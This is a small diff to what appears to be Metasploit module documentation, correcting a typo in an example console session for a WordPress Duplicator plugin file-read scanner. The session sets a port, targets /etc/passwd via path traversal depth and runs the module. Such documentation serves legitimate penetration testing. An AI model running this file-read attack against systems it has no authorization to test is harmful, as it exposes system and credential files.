@@ -24,7 +24,7 @@ msf5 auxiliary(scanner/http/wp_duplicator_file_read) > set rport 8080
 rport => 8080
 msf5 auxiliary(scanner/http/wp_duplicator_file_read) > set FILEPATH /etc/passwd
 FILEPATH => /etc/passwd
-msf5 auxiliary(scanner/http/wp_duplicator_file_read) > set FILEPATH DEPTH 5
+msf5 auxiliary(scanner/http/wp_duplicator_file_read) > set DEPTH 5
 DEPTH => 5
 
 msf5 auxiliary(scanner/http/wp_duplicator_file_read) > run
